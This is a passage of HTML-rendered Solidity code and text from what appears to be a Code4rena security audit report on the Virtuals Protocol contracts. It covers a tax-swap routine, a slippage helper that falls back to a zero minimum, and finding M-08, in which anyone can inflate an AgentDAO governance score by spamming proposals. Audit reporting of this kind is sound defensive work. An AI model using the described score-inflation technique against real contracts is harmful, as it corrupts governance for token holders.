swap\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // amount.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        //\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // For example:\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        //  * swap Balance is 250\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        //  * contract balance is 385.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        //  * projectTaxPendingSwap is 300\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        //\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // The new total for the projectTaxPendingSwap is:\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        //   = 300 - ((300 * 250) / 385)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        //   = 300 - 194\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        //   = 106\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        if (swapBalance_ \u0026lt; contractBalance_) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            projectTaxPendingSwap -= uint128((projectTaxPendingSwap * swapBalance_) / contractBalance_);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } else {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            projectTaxPendingSwap = 0;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    } catch {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Don\u0026#39;t allow a failed external call (in this case to uniswap) to stop a transfer.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Emit that this has occurred and continue.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        emit ExternalCallError(5);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBelow is the \u003ccode\u003ecalculateMinimumAmountOut\u003c/code\u003e implementation:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e/**\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e@dev\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e Calculates the minimum amount out for a swap to protect against front-running\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e@param\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e The amount of tokens to swap\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e@param\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e The swap path\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e@return\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e minAmountOut The minimum amount of tokens to receive\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e */\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecalculateMinimumAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Use getAmountsOut to calculate the expected output amount\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003etry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_uniswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAmountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ecatch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// If getAmountsOut fails, use a fallback method or return 0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// In case of failure, fallback to 0 to ensure the transaction doesn\u0026#39;t revert\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// If successful, calculate minimum amount with slippage tolerance (e.g., 3%)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpectedAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountsOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Apply 3% slippage tolerance: amountOutMin = expectedAmountOut * 0.97\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpectedAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e97\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminAmountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-08-score-in-agentdao-is-not-an-accurate-measure-and-can-be-artificially-inflated-by-spamming-proposals\" style=\"position:relative;\"\u003e\u003ca href=\"#m-08-score-in-agentdao-is-not-an-accurate-measure-and-can-be-artificially-inflated-by-spamming-proposals\" aria-label=\"m 08 score in agentdao is not an accurate measure and can be artificially inflated by spamming proposals permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-29\"\u003e[M-08] Score in \u003ccode\u003eAgentDAO\u003c/code\u003e is not an accurate measure and can be artificially inflated by spamming proposals\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-361\"\u003eBowTiedOriole\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-54\"\u003ekanra\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-253\"\u003emaxzuvex\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentDAO.sol#L135-L141\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentDAO.sol#L135-L141\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact\" aria-label=\"finding description and impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eIn \u003ccode\u003eAgentDAO._castVote()\u003c/code\u003e, a user’s score is updated anytime they vote on a proposal. This is a problem because submitting a proposal is permissionless, and the default proposal threshold is 0.\u003c/p\u003e\n\u003cp\u003eIn addition, the user does not even need to hold any veTokens to vote and receive a score.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003esuper\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_castVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereason\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (!\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotedPreviously\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ehasVoted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ++\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_scores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSafeCast\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoUint48\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSafeCast\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoUint208\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003escoreOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// @audit-medium Anybody can create dummy proposal and vote to increase score\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_updateMaturity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eScore should not be used as a trustworthy parameter as long as submitting proposals is permissionless. Additionally, consider adding a check that \u003ccode\u003eweight \u003e 0\u003c/code\u003e before increasing a user’s score.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-10\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 